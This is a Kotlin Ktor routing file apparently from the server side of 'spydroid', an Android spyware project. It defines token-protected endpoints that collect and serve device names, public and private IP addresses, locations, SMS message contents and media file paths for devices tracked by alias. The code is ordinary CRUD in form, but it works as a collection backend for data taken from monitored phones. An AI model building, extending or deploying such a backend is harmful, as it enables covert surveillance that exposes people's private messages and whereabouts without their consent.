/*
 * Copyright (C) 2024 Daniel Gómez(Less)
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <https://www.gnu.org/licenses/>.
 */

package net.spydroid.server.plugins

import io.ktor.http.HttpStatusCode
import io.ktor.server.application.*
import io.ktor.server.request.receive
import io.ktor.server.request.receiveParameters
import io.ktor.server.response.*
import io.ktor.server.routing.*
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import net.spydroid.server.domain.DevicesRepository
import net.spydroid.server.domain.InfoRepository
import net.spydroid.server.domain.MultimediaRepository
import net.spydroid.server.domain.SmsRepository
import net.spydroid.server.models.DeviceHandler
import net.spydroid.server.models.InfoHandler
import net.spydroid.server.models.MultimediaHandler
import net.spydroid.server.models.SmsHandler
import org.koin.ktor.ext.inject


// Main Routes
private object Routes {
    const val DEVICES = "/devices"
    const val INFO = "/info"
    const val MULTIMEDIA = "/multimedia"
    const val SMS = "/sms"
}

// Global Params
private object PARAMS {
    const val ACCESS_TOKEN = "access_token"
    const val ALIAS = "alias"
    val SEARCH = "search"
    val ALL = "ALL"
}

private object BAD_REQUESTS_RESPONSES {
    // If access token does not exist
    const val ACCESS_TOKEN = "Missing access token"

    // If alias does not exist
    const val ALIAS = "Missing alias"

    // If access token is not in list from valid tokens
    const val INVALID_ACCESS_TOKEN = "Invalid access token"
}

private const val SUCCESSFULL_POST = "Successfully uploaded data"

fun Application.configureRouting(validTokens: Set<String>) {
    routing {
        devices(validTokens)
        //info(validTokens)
        sms(validTokens)
        multimedia(validTokens)
    }
}

private fun Route.devices(validTokens: Set<String>) {

    val devicesRepository: DevicesRepository by inject()

    val DEVICES_PARAMS = object {
        val NAME = "name"
    }

    val DEVICES_MESSAGES = object {
        val NAME = "Missing Name"
    }

    val INFO_PARAMAS = object {
        val IP_PUBLIC = "ip_public"
        val IP_PRIVATE = "ip_private"
        val LOCATION = "location"
    }

    val INFO_MESSAGES = object {
        val IP_PUBLIC = "Missing Public Ip Address "
        val IP_PRIVATE = "Missing Private Ip Address"
        val LOCATION = "Missing Location"
    }

    get(Routes.DEVICES) {

        val accessToken = call.request.queryParameters[PARAMS.ACCESS_TOKEN]
        val searchParam = call.parameters[PARAMS.SEARCH] ?: PARAMS.ALL

        if (accessToken in validTokens) {
            if (searchParam != PARAMS.ALL) {
                val devices = devicesRepository.filerWithAlias(searchParam)
                call.respond(devices)
            } else {
                val devices = devicesRepository.getALlDevices()
                call.respond(devices)
            }
        } else {
            call.respond(HttpStatusCode.Unauthorized, BAD_REQUESTS_RESPONSES.INVALID_ACCESS_TOKEN)
        }
    }

    post(Routes.DEVICES) {
        val params = call.receiveParameters()

        val accessToken = params[PARAMS.ACCESS_TOKEN] ?: return@post call.respond(
            HttpStatusCode.BadRequest,
            BAD_REQUESTS_RESPONSES.ACCESS_TOKEN
        )
        val alias = params[PARAMS.ALIAS] ?: return@post call.respond(
            HttpStatusCode.BadRequest,
            BAD_REQUESTS_RESPONSES.ALIAS
        )
        val name = params[DEVICES_PARAMS.NAME] ?: return@post call.respond(
            HttpStatusCode.BadRequest,
            DEVICES_MESSAGES.NAME
        )
        val ip_address_public = params[INFO_PARAMAS.IP_PUBLIC] ?: return@post call.respond(
            HttpStatusCode.BadRequest,
            INFO_MESSAGES.IP_PUBLIC
        )

        val ip_address_private = params[INFO_PARAMAS.IP_PRIVATE] ?: return@post call.respond(
            HttpStatusCode.BadRequest,
            INFO_MESSAGES.IP_PRIVATE
        )

        val location = params[INFO_PARAMAS.LOCATION] ?: return@post call.respond(
            HttpStatusCode.BadRequest,
            INFO_MESSAGES.LOCATION
        )
        if (accessToken in validTokens) {
            this.launch(Dispatchers.IO) {
                devicesRepository.insert(
                    DeviceHandler(
                        alias = alias,
                        name = name,
                        ip_address_public = ip_address_public,
                        ip_address_private = ip_address_private,
                        location = location
                    )
                )
            }
            call.respond(
                HttpStatusCode.OK,
                SUCCESSFULL_POST
            )
        } else {
            call.respond(HttpStatusCode.Unauthorized, BAD_REQUESTS_RESPONSES.INVALID_ACCESS_TOKEN)
        }
    }


    put("${Routes.DEVICES}/{${PARAMS.ALIAS}}") {
        val params = call.receiveParameters()

        // Obtener el alias desde los parámetros de la ruta
        val alias = call.parameters[PARAMS.ALIAS] ?: return@put call.respond(
            HttpStatusCode.BadRequest,
            BAD_REQUESTS_RESPONSES.ALIAS
        )

        // Obtener el nuevo nombre desde los parámetros del cuerpo
        val newName = params[DEVICES_PARAMS.NAME] ?: return@put call.respond(
            HttpStatusCode.BadRequest,
            DEVICES_MESSAGES.NAME
        )

        // Verificar el token de acceso
        val accessToken = params[PARAMS.ACCESS_TOKEN] ?: return@put call.respond(
            HttpStatusCode.BadRequest,
            BAD_REQUESTS_RESPONSES.ACCESS_TOKEN
        )

        val ip_address_public = params[INFO_PARAMAS.IP_PUBLIC] ?: return@put call.respond(
            HttpStatusCode.BadRequest,
            INFO_MESSAGES.IP_PUBLIC
        )

        val ip_address_private = params[INFO_PARAMAS.IP_PRIVATE] ?: return@put call.respond(
            HttpStatusCode.BadRequest,
            INFO_MESSAGES.IP_PRIVATE
        )

        val location = params[INFO_PARAMAS.LOCATION] ?: return@put call.respond(
            HttpStatusCode.BadRequest,
            INFO_MESSAGES.LOCATION
        )

        if (accessToken in validTokens) {
            try {
                devicesRepository.update(
                    DeviceHandler(
                        alias = alias,
                        name = newName,
                        ip_address_public = ip_address_public,
                        ip_address_private = ip_address_private,
                        location = location
                    )
                )
                call.respond(HttpStatusCode.OK, "Device name updated successfully")
            } catch (e: Exception) {
                call.respond(HttpStatusCode.NotFound, "No device found with alias $alias")
                call.respond(
                    HttpStatusCode.InternalServerError,
                    "Failed to update device: ${e.message}"
                )
            }
        } else {
            call.respond(HttpStatusCode.Unauthorized, BAD_REQUESTS_RESPONSES.INVALID_ACCESS_TOKEN)
        }
    }


}


/*
private fun Route.info(validTokens: Set<String>) {

    val infoRepository: InfoRepository by inject()

    val INFO_PARAMAS = object {
        val IP_PUBLIC = "ip_public"
        val IP_PRIVATE = "ip_private"
        val LOCATION = "location"
    }

    val INFO_MESSAGES = object {
        val IP_PUBLIC = "Missing Public Ip Address "
        val IP_PRIVATE = "Missing Private Ip Address"
        val LOCATION = "Missing Location"
    }

    get(Routes.INFO) {
        val accessToken = call.request.queryParameters[PARAMS.ACCESS_TOKEN]
        val searchParam = call.parameters[PARAMS.SEARCH] ?: PARAMS.ALL

        if (accessToken in validTokens) {
            if (searchParam != PARAMS.ALL) {
                val info = infoRepository.filerWithAlias(searchParam)
                call.respond(info)
            } else {
                val info = infoRepository.getAllInfo()
                call.respond(info)
            }
        }
    }

    post(Routes.INFO) {
        val params = call.receiveParameters()

        val accessToken = params[PARAMS.ACCESS_TOKEN] ?: return@post call.respond(
            HttpStatusCode.BadRequest,
            BAD_REQUESTS_RESPONSES.ACCESS_TOKEN
        )
        val alias = params[PARAMS.ALIAS] ?: return@post call.respond(
            HttpStatusCode.BadRequest,
            BAD_REQUESTS_RESPONSES.ALIAS
        )
        val ip_address_public = params[INFO_PARAMAS.IP_PUBLIC] ?: return@post call.respond(
            HttpStatusCode.BadRequest,
            INFO_MESSAGES.IP_PUBLIC
        )

        val ip_address_private = params[INFO_PARAMAS.IP_PRIVATE] ?: return@post call.respond(
            HttpStatusCode.BadRequest,
            INFO_MESSAGES.IP_PRIVATE
        )

        val location = params[INFO_PARAMAS.LOCATION] ?: return@post call.respond(
            HttpStatusCode.BadRequest,
            INFO_MESSAGES.LOCATION
        )

        if (accessToken in validTokens) {
            this.launch(Dispatchers.IO) {
                infoRepository.insert(
                    InfoHandler(
                        alias = alias,
                        ip_address_public = ip_address_public,
                        ip_address_private = ip_address_private,
                        location = location
                    )
                )
            }
            call.respond(
                HttpStatusCode.OK,
                SUCCESSFULL_POST
            )
        } else {
            call.respond(HttpStatusCode.Unauthorized, BAD_REQUESTS_RESPONSES.INVALID_ACCESS_TOKEN)
        }
    }

    put("${Routes.INFO}/{${PARAMS.ALIAS}}") {
        val params = call.receiveParameters()

        val accessToken = params[PARAMS.ACCESS_TOKEN] ?: return@put call.respond(
            HttpStatusCode.BadRequest,
            BAD_REQUESTS_RESPONSES.ACCESS_TOKEN
        )

        val alias = call.parameters[PARAMS.ALIAS] ?: return@put call.respond(
            HttpStatusCode.BadRequest,
            BAD_REQUESTS_RESPONSES.ALIAS
        )

        val ip_address_public = params[INFO_PARAMAS.IP_PUBLIC] ?: return@put call.respond(
            HttpStatusCode.BadRequest,
            INFO_MESSAGES.IP_PUBLIC
        )

        val ip_address_private = params[INFO_PARAMAS.IP_PRIVATE] ?: return@put call.respond(
            HttpStatusCode.BadRequest,
            INFO_MESSAGES.IP_PRIVATE
        )

        val location = params[INFO_PARAMAS.LOCATION] ?: return@put call.respond(
            HttpStatusCode.BadRequest,
            INFO_MESSAGES.LOCATION
        )

        if (accessToken in validTokens) {
            try {
                infoRepository.update(
                    InfoHandler(
                        alias = alias,
                        ip_address_public = ip_address_public,
                        ip_address_private = ip_address_private,
                        location = location
                    )
                )
                call.respond(HttpStatusCode.OK, "Info updated successfully")

            } catch (e: Exception) {
                call.respond(HttpStatusCode.NotFound, "No info found with alias $alias")
                call.respond(
                    HttpStatusCode.InternalServerError,
                    "Failed to update info: ${e.message}"
                )
            }

            call.respond(
                HttpStatusCode.OK,
                SUCCESSFULL_POST
            )
        } else {
            call.respond(HttpStatusCode.Unauthorized, BAD_REQUESTS_RESPONSES.INVALID_ACCESS_TOKEN)
        }
    }
}
 */

private fun Route.sms(validTokens: Set<String>) {

    val smsRepository: SmsRepository by inject()

    val SMS_PARAMS = object {
        val SMS = "sms"
    }

    val SMS_MESSAGES = object {
        val SMS = "Missing Sms"
    }

    get(Routes.SMS) {
        val accessToken = call.request.queryParameters[PARAMS.ACCESS_TOKEN]
        val searchParam = call.parameters[PARAMS.SEARCH] ?: PARAMS.ALL
        if (accessToken in validTokens) {
            if (searchParam != PARAMS.ALL) {
                val sms = smsRepository.filerWithAlias(searchParam)
                call.respond(sms)
            } else {
                val sms = smsRepository.getALlSms()
                call.respond(sms)
            }
        }
    }

    post(Routes.SMS) {
        val params = call.receiveParameters()

        val accessToken = params[PARAMS.ACCESS_TOKEN] ?: return@post call.respond(
            HttpStatusCode.BadRequest,
            BAD_REQUESTS_RESPONSES.ACCESS_TOKEN
        )
        val alias = params[PARAMS.ALIAS] ?: return@post call.respond(
            HttpStatusCode.BadRequest,
            BAD_REQUESTS_RESPONSES.ALIAS
        )
        val sms = params[SMS_PARAMS.SMS] ?: return@post call.respond(
            HttpStatusCode.BadRequest,
            SMS_MESSAGES.SMS
        )

        if (accessToken in validTokens) {
            this.launch(Dispatchers.IO) {
                smsRepository.insert(
                    SmsHandler(
                        alias = alias,
                        sms = sms
                    )
                )
            }
            call.respond(
                HttpStatusCode.OK,
                SUCCESSFULL_POST
            )
        } else {
            call.respond(HttpStatusCode.Unauthorized, BAD_REQUESTS_RESPONSES.INVALID_ACCESS_TOKEN)
        }
    }

    put("${Routes.SMS}/{${PARAMS.ALIAS}}") {
        val params = call.receiveParameters()

        val accessToken = params[PARAMS.ACCESS_TOKEN] ?: return@put call.respond(
            HttpStatusCode.BadRequest,
            BAD_REQUESTS_RESPONSES.ACCESS_TOKEN
        )

        val alias = call.parameters[PARAMS.ALIAS] ?: return@put call.respond(
            HttpStatusCode.BadRequest,
            BAD_REQUESTS_RESPONSES.ALIAS
        )

        val sms = params[SMS_PARAMS.SMS] ?: return@put call.respond(
            HttpStatusCode.BadRequest,
            SMS_MESSAGES.SMS
        )

        if (accessToken in validTokens) {
            try {
                smsRepository.update(
                    SmsHandler(
                        alias = alias,
                        sms = sms
                    )
                )
                call.respond(HttpStatusCode.OK, "Sms update Successfull")
            } catch (e: Exception) {
                call.respond(HttpStatusCode.NotFound, "Sms with alias $alias is not found")
                call.respond(HttpStatusCode.InternalServerError, "Failed to update sms: ${e.message}")
            }
            call.respond(
                HttpStatusCode.OK,
                SUCCESSFULL_POST
            )
        } else {
            call.respond(HttpStatusCode.Unauthorized, BAD_REQUESTS_RESPONSES.INVALID_ACCESS_TOKEN)
        }
    }
}

private fun Route.multimedia(validTokens: Set<String>) {

    val multimediaRepository: MultimediaRepository by inject()

    val MULTI_PARAMS = object {
        val ROUTE_FILE = "route_file"
        val TYPE = "type"
    }

    val MULTI_MESSAGES = object {
        val ROUTE_FILE = "Missing route file"
        val TYPE = "Missing type file"
    }

    get(Routes.MULTIMEDIA) {
        val accessToken = call.request.queryParameters[PARAMS.ACCESS_TOKEN]
        val searchParam = call.parameters[PARAMS.SEARCH] ?: PARAMS.ALL
        if (accessToken in validTokens) {
            if (searchParam != PARAMS.ALL) {
                val multimedia = multimediaRepository.filerWithAlias(searchParam)
                call.respond(multimedia)
            } else {
                val multimedia = multimediaRepository.getAllMultimedia()
                call.respond(multimedia)
            }
        }
    }

    post(Routes.MULTIMEDIA) {
        val params = call.receiveParameters()

        val accessToken = params[PARAMS.ACCESS_TOKEN] ?: return@post call.respond(
            HttpStatusCode.BadRequest,
            BAD_REQUESTS_RESPONSES.ACCESS_TOKEN
        )
        val alias = params[PARAMS.ALIAS] ?: return@post call.respond(
            HttpStatusCode.BadRequest,
            BAD_REQUESTS_RESPONSES.ALIAS
        )
        val routeFile = params[MULTI_PARAMS.ROUTE_FILE] ?: return@post call.respond(
            HttpStatusCode.BadRequest,
            MULTI_MESSAGES.ROUTE_FILE
        )

        val type = params[MULTI_PARAMS.TYPE] ?: return@post call.respond(
            HttpStatusCode.BadRequest,
            MULTI_MESSAGES.TYPE
        )

        if (accessToken in validTokens) {
            this.launch(Dispatchers.IO) {
                multimediaRepository.insert(
                    MultimediaHandler(
                        alias = alias,
                        routeFile = routeFile,
                        type = type
                    )
                )
            }
            call.respond(
                HttpStatusCode.OK,
                SUCCESSFULL_POST
            )
        } else {
            call.respond(HttpStatusCode.Unauthorized, BAD_REQUESTS_RESPONSES.INVALID_ACCESS_TOKEN)
        }
    }

    put("${Routes.MULTIMEDIA}/{${PARAMS.ALIAS}}") {
        val params = call.receiveParameters()

        val accessToken = params[PARAMS.ACCESS_TOKEN] ?: return@put call.respond(
            HttpStatusCode.BadRequest,
            BAD_REQUESTS_RESPONSES.ACCESS_TOKEN
        )

        val alias = call.parameters[PARAMS.ALIAS] ?: return@put call.respond(
            HttpStatusCode.BadRequest,
            BAD_REQUESTS_RESPONSES.ALIAS
        )

        val routeFile = params[MULTI_PARAMS.ROUTE_FILE] ?: return@put call.respond(
            HttpStatusCode.BadRequest,
            MULTI_MESSAGES.ROUTE_FILE
        )

        val type = params[MULTI_PARAMS.TYPE] ?: return@put call.respond(
            HttpStatusCode.BadRequest,
            MULTI_MESSAGES.TYPE
        )

        if (accessToken in validTokens) {
            try {
                multimediaRepository.update(
                    MultimediaHandler(
                        alias = alias,
                        routeFile = routeFile,
                        type = type
                    )
                )
                call.respond(HttpStatusCode.OK, "Multimedia updated successfully")
            } catch (e: Exception) {
                call.respond(HttpStatusCode.NotFound, "No Multimedia found with alias $alias")
                call.respond(
                    HttpStatusCode.InternalServerError,
                    "Failed to update Multimeida: ${e.message}"
                )
            }
        } else {
            call.respond(HttpStatusCode.Unauthorized, BAD_REQUESTS_RESPONSES.INVALID_ACCESS_TOKEN)
        }
    }
}
